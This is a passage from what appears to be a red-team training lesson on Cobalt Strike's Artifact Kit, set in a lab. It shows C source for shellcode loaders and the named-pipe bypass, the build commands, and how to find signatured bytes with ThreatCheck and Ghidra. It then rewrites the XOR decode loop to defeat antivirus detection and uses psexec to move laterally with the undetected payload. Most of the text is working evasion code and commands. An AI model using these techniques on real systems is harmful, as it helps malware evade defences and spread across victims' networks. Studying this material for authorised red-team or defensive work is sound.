obalt Strike has various flavour of EXEs and DLLs that are used within its workflows.  It's common for users to not realise that these payloads work by injecting Beacon shellcode (into themselves, with the exception of the Service EXE).  The Artifact Kit is designed to facilitate the development of sandbox-safe variants of these payloads based on the premise of loading said shellcode in a manner in which AV engines cannot emulate.  It works on a system of "bypass templates" which allow you to change existing bypass strategies for reading shellcode, or implement entirely new ones.

The kit can be found in `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact`.

`src-main/main.c` is the entry point for the EXE artifacts.  It does nothing more than run a function called `start` and then just loops to prevent the process from closing.
```c
#include "windows.h"

void start(HINSTANCE handle);

int main(int argc, char * argv[]) {
	start(NULL);

	/* sleep so we don't exit */
	while (TRUE)
		WaitForSingleObject(GetCurrentProcess(), 10000);

	return 0;
}
```
  

`src-common/bypass-template.c` is not a "bypass", but it serves to show how one can implement some logic inside that `start` function.  It simply grabs the payload buffer, copies it into a new memory regions, calls a `spawn` function and then frees the buffer.  This function and other parts of the program can be found in `patch.c` and `injector.c.`
```c
void start(HINSTANCE mhandle) {
	/* phear is a struct that defines how artifact.cna will patch the payload data
	   into this artifact. You're welcome to update artifact.cna to use your own
	   convention if you like. */
	phear * payload = (phear *)data;
	char * buffer;

	/* copy our encoded payload into its own buffer... necessary b/c spawn modifies it */
	buffer = (char *)malloc(payload->length);
	memcpy(buffer, payload->payload, payload->length);

	/* execute our payload */
	spawn(buffer, payload->length, payload->key);

	/* clean up after ourselves */
	free(buffer);
}
```
  

One of the bypass strategies included in the kit is called `bypass-pipe`.
```c
void start(HINSTANCE mhandle) {
   sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));

   /* start our server and our client */
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
   client_thread(NULL);
}
```
  

First, `sprintf` is used to create a pseudo-random pipe name called _\\.\pipe\netsvc\X_ (where X is a random integer).  `server_thread` will start a new named pipe server and copy the shellcode buffer into it.  `client_thread` will read the shellcode from the pipe and then call those same spawn & free functions.  So, the only difference between bypass-template and bypass-pipe is that memcpy is replaced with named pipes.  The idea being that AV engines cannot emulate this process.

Of course, there is some scope for detecting other aspects of this specific bypass technique, such as the pipe name.  That is, of course, trivial to change here.

The Artifact Kit is designed to be built on Linux via the included `build.sh` script.  Running it without any arguments will show the usage.
```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [-] Missing Parameters:
[Artifact kit] [-] Usage:
[Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
[Artifact kit] [-]  - Techniques       - a space separated list
[Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
[Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
[Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
[Artifact kit] [-]                       For a 5K   RDLL stage size should be 296948 or larger
[Artifact kit] [-]                       For a 100K RDLL stage size should be 424948 or larger
[Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
[Artifact kit] [-]  - Resource File    - true or false to include the resource file
[Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
[Artifact kit] [-]  - Syscalls         - set the system call method
[Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
[Artifact kit] [-]  - Output Directory - Destination directory to save the output
[Artifact kit] [-] Example:
[Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 361000 5 true true indirect /tmp/dist/artifact
```
  

It looks a bit scary at first, but each option is explained in the help.  You can also review the README.md file inside the artifact kit directory for more information.  Let's build a new set of payload templates using the pipe technique and VirtualAlloc (keeping the other options as false/none).
```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 296948 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 296948
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```
  

This will build each variant of the EXE and DLL - staged, stageless, 32, and 64-bit.  It will also produce an `artifact.cna` file that we need to load into the Cobalt Strike UI.  Go to _Cobalt Strike > Script Manager > Load_ and select the CNA file in your output directory.  Any DLL and EXE payloads that you generate from hereon will use those new artifacts.  Use _Payloads > Windows Stageless Generate All Payloads_ to replace all of your payloads in `C:\Payloads`.

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) is a tool to help identify malicious bytes in a file.  Run it against the new payloads to see if they will trigger any detection signatures.  This is an example from an SMB service binary payload.
```
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
[+] Target file size: 315392 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0xBEB
00000000   AB B9 06 00 00 00 4C 89  E7 4C 8D 05 05 B9 04 00   «1····L?çL?··1··
00000010   F3 AB 4C 89 E9 C7 84 24  88 00 00 00 68 00 00 00   ó«L?éÇ?$?···h···
00000020   FF 15 57 FD 04 00 45 31  C9 45 31 C0 31 C9 4C 89   ÿ·Wy··E1ÉE1A1ÉL?
00000030   64 24 48 4C 89 EA 48 89  6C 24 40 48 C7 44 24 38   d$HL?êH?l$@HÇD$8
00000040   00 00 00 00 48 C7 44 24  30 00 00 00 00 C7 44 24   ····HÇD$0····ÇD$
00000050   28 04 00 00 00 C7 44 24  20 01 00 00 00 FF 15 8A   (····ÇD$ ····ÿ·?
00000060   FB 04 00 85 C0 74 32 48  8B 4C 24 70 48 85 C9 74   û··?At2H?L$pH?Ét
00000070   28 0F 10 44 24 70 48 8D  54 24 50 4C 63 CE 49 89   (··D$pH?T$PLcII?
00000080   D8 48 8B 84 24 80 00 00  00 0F 11 44 24 50 48 89   OH??$?·····D$PH?
00000090   44 24 60 E8 6E FE FF FF  90 48 81 C4 F8 04 00 00   D$`èn_ÿÿ?H?Äo···
000000A0   5B 5E 5F 5D 41 5C 41 5D  C3 57 56 48 83 EC 68 48   [^_]A\A]AWVH?ìhH
000000B0   8D 35 62 B8 04 00 31 C0  49 89 C9 48 8D 7C 24 20   ?5b,··1AI?ÉH?|$
000000C0   B9 10 00 00 00 41 89 D2  F3 A5 4C 89 C2 4C 8D 44   1····A?Oó¥L?AL?D
000000D0   24 20 48 89 C1 83 E1 07  8A 0C 0A 41 30 0C 00 48   $ H?A?á·?··A0··H
000000E0   FF C0 48 83 F8 40 75 EA  31 C0 41 39 C2 7E 12 48   ÿAH?o@uê1AA9A~·H
000000F0   89 C1 83 E1 07 8A 0C 0A  41 30 0C 01 48 FF C0 EB   ?A?á·?··A0··HÿAë
```
  

The output shows that there's "something" it doesn't like, but there's not much context around what this is or where it is in the binary.  Reversing tools such as [IDA](https://hex-rays.com/) and [Ghidra](https://github.com/NationalSecurityAgency/ghidra) can help here because it allows us to dissect the payload.  Launch Ghidra by running the start script at `C:\Tools\ghidra-10.3.1\ghidraRun.bat`.  Create a new non-shared project from _File > New Project,_ then import your payload by going to _File > Import File_.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/733/eca/954/ghidra-project.png)

  

Double-click on the imported file to open it in the _CodeBrowser_.  When prompted, select _Yes_ to analyze the binary (the default selected analyzers are fine).  This may take a few minutes to complete - you will see a progress bar in the bottom-right of the window.

The next task is to find the portion of code reported by ThreatCheck in Ghidra, for which there are two main ways.  The first is to search for a specific byte sequence output by ThreatCheck, for example `89 C1 83 E1 07 8A 0C 0A 41 30 0C 01 48 FF C0 EB`.  Go to _Search > Memory_, paste the string into the search box and click _Search All_.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/8b6/7de/356/search-memory.png)

  

Here we have one result.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/956/a4a/d1f/search-memory-result.png)

  

Clicking on it will take you to the location in the code browser.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/8a5/afe/64b/bad-code.png)

  

The other method is to use the "bad bytes offset" as given by ThreatCheck.  _Select Navigation > Go To_ and enter `file(n)` where `n` is the offset.  In this case it would be `file(0xBEB)`.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/4cd/cba/3e3/go-to-offset.png)

  

Unfortunately, we don't have debug symbols for the compiled payloads so function and variables names will be quite generic, like `FUN_xxx` and `lVarx`.  However, we can still quite easily see that the portion of highlighted code is a `for` loop.  We can go back to the Artifact Kit source code and search for any such loops.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/3e8/dd2/337/vscode-search.png)

  

We can dismiss most of these files because we didn't use the readfile template nor compiled the artifacts with syscalls enabled.  Therefore, the candidates in `patch.c` seem the most promising.  Because this is a service binary payload, we know that it will perform a "migration" (i.e. it spawns a new process and injects Beacon shellcode into it before exiting).  This `spawn` function under an `#ifdef _MIGRATE_` directive is a dead ringer for the decompiled version in Ghidra.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/9b3/87c/30f/comparison.png)

  

To break the detection, we just have to modify the routine so that it compiles to a different byte sequence.  For example:
```c
for (x = 0; x < length; x++) {
    char* ptr;

    ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}
```
  

Rebuild the Artifact Kit and regenerate the payloads in CS.  The SMB service binary will no longer be detected and will allow us to jump to the file server.
```
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
[+] No threat found!
[*] Run time: 1.17s

beacon> jump psexec64 fs.dev.cyberbotic.io smb
Started service 96126c2 on fs.dev.cyberbotic.io

[+] established link to child beacon: 10.10.122.15
```
  

Simply unload the CNA from the Script Manager if you want to revert back to the default payloads.

  

  Each payload variant will likely have different static signatures that you need to remove through analysis and experimentation.